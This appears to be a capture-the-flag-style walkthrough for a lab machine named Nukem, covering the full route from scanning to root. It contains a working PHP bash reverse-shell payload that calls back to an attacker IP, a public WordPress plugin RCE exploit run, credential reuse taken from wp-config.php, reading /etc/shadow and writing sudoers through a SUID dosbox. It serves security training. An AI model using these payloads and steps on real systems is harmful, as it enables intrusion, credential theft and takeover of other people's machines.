_____

# Exploitation Guide for Nukem

## Summary

In this walkthrough, we'll gain RCE via a vulnerable plugin in the WordPress installation. After careful enumeration, we discover a SUID binary that requires GUI access. With more enumeration we discover a VNC service, reuse a discovered password, and leverage the SUID binary to gain root access.

## Enumeration

### Nmap

We'll start off with an `nmap` scan.

```
kali@kali:~$ sudo nmap -sV -sC 192.168.120.55
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-06 17:56 -03
Nmap scan report for 192.168.120.55
Host is up (0.15s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
3306/tcp open  mysql?
| fingerprint-strings: 
|   GetRequest, NCP, NULL, NotesRPC, TLSSessionReq, X11Probe, afp, giop: 
|_    Host '192.168.118.8' is not allowed to connect to this MariaDB server
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=10/6%Time=5F7CDA22%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest
SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TLSSessionRe
SF:q,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4C
SF:,"H\0\0\x01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4C,"H\0\0\x
SF:01\xffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4C,"H\0\0\x01\x
SF:ffj\x04Host\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(afp,4C,"H\0\0\x01\xffj\x04Ho
SF:st\x20'192\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to
SF:\x20this\x20MariaDB\x20server")%r(giop,4C,"H\0\0\x01\xffj\x04Host\x20'1
SF:92\.168\.118\.8'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this
SF:\x20MariaDB\x20server");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.49 seconds

```

### WPScan

There are several interesting services, but we'll begin by exploring the WordPress installation on port 80 with `wpscan`.

```
kali@kali:~$ wpscan --url http://192.168.120.55/
...
[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.120.55/wp-content/plugins/simple-file-list/
 | Last Updated: 2020-08-24T21:35:00.000Z
 | [!] The version is out of date, the latest version is 4.2.11
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.120.55/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.120.55/wp-content/plugins/simple-file-list/readme.txt

[+] tutor
 | Location: http://192.168.120.55/wp-content/plugins/tutor/
 | Last Updated: 2020-09-22T09:55:00.000Z
 | [!] The version is out of date, the latest version is 1.7.0
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.3 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.120.55/wp-content/plugins/tutor/readme.txt

...

```

We discover an RCE exploit for the [_simple-file-list_ plugin](https://www.exploit-db.com/exploits/48979).

## Exploitation

### WordPress Plugin Remote Code Execution

Let's copy the exploit to our working directory, replacing the line 36 of the exploit with our attacking machine's IP address and the appropriate port number:

```
payload = '<?php passthru("bash -i >& /dev/tcp/192.168.118.8/80 0>&1"); ?>'
```

Before running the exploit, we'll set up a Netcat listener.

```
kali@kali:~$ sudo nc -lvnp 80
listening on [any] 80 ...
```

With the listener running, we'll execute the exploit.

```
kali@kali:~$ python3 48979.py http://192.168.120.55
[ ] File 9357.png generated with password: b3824ae2f451a1801fab81d9ff080139
[ ] File uploaded at http://192.168.120.55/wp-content/uploads/simple-file-list/9357.png
[ ] File moved to http://192.168.120.55/wp-content/uploads/simple-file-list/9357.php
[+] Exploit seem to work.
[*] Confirmning ...
```

Our Netcat listener should have caught the reverse shell.

```
kali@kali:~$ sudo nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.118.8] from (UNKNOWN) [192.168.120.55] 54012
bash: cannot set terminal process group (352): Inappropriate ioctl for device
bash: no job control in this shell
[http@nukem simple-file-list]$
```

### Password Reuse

As we begin to enumerate, we identify a _commander_ user in the home directory. After careful enumeration, we discover the password for the MySQL server:

```
[http@nukem http]$ cat wp-config.php
cat wp-config.php
...
/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', 'CommanderKeenVorticons1990' );
...
```

Let's test these credentials.

```
$ ssh commander@192.168.120.55
The authenticity of host '192.168.120.55 (192.168.120.55)' can't be established.
ECDSA key fingerprint is SHA256:12pFiOx1TBYX+6LlFEj3HR0305rPpXDWLKkdg1JLYSM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.120.55' (ECDSA) to the list of known hosts.
commander@192.168.120.55's password: CommanderKeenVorticons1990
[commander@nukem ~]$ 
```

Success! We have access as _commander_.

## Escalation

### Dosbox SUID

While enumerating, we discover several SUID binaries.

```
[commander@nukem ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/su
/usr/bin/ksu
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/expiry
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chage
/usr/bin/dosbox **
/usr/bin/newgrp
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd
```

The Dosbox binary has the SUID bit set, but it won't start in the console. We'll instead need to gain access to the graphical interface. Fortunately, a VNC session is running on this server on port 5901.

```
[commander@nukem ~]$ ps -ef | grep vnc
root         367       1  0 01:48 ?        00:00:00 /usr/bin/vncsession commander :1
root         368     367  0 01:48 ?        00:00:00 [vncsession] <defunct>
command+     400     367  0 01:48 ?        00:00:00 xinit /etc/lightdm/Xsession startxfce4 -- /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
command+     405     400  0 01:48 ?        00:00:00 /usr/bin/Xvnc :1 -alwaysshared -geometry 1024x728 -localhost -auth /home/commander/.Xauthority -desktop nukem:1 (commander) -fp /usr/share/fonts/75dpi,/usr/share/fonts/100dpi -pn -rfbauth /home/commander/.vnc/passwd -rfbport 5901 -rfbwait 30000
command+     845     829  0 02:40 pts/0    00:00:00 grep vnc
```

Let's use port redirection to try to reach this service.

```
kali@kali:~$ ssh -L 5901:localhost:5901 commander@192.168.120.55
commander@192.168.120.55's password:
Last login: Wed Sep 30 02:36:30 2020 from 192.168.118.8
[commander@nukem ~]$
```

Now, let's use `vncviewer` to connect.

```
kali@kali:~$ vncviewer localhost:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: CommanderKeenVorticons1990
Authentication successful

Desktop name "nukem:1 (commander)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

We are greeted with an XFCE desktop.

# Updating Sudoers File

LEt s open a terminal in the remote session and run `dosbox`. This results in classic DOS prompt.

![dosbox](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_38_image_1_smk2EeWJ.png)

dosbox

Following the [Dosbox WIKI](https://www.dosbox.com/wiki/MOUNT), we discover that the application should let us mount the file system. Let's try to mount the /etc directory and access the `shadow` file:

```
Z:\> mount C /etc
Drive C is mounted as local directory /etc/

Z:\> C:

C:\> type shadow
root:$6$MfW0zuduZhJE.svF$uDYH.../K0:18523::::::
bin:!*:18523::::::
daemon:!*:18523:::::
...
```

This confirms that we can read high-privileged files with DOS. We also discover that SUDO is present on the system. Let's add the _commander_ user to sudo and give our account full privileges.

```
C:\> dir sudoers
Directory of C:\
SUDOERS    3,176   30-09-2020  14:00

C:\> echo commander ALL=(ALL) ALL >> sudoers
```

Now, in our SSH session, we can use sudo to escalate to root.

```
[commander@nukem ~]$ sudo -i
[sudo] password for commander:

[root@nukem ~]# whoami
root
```
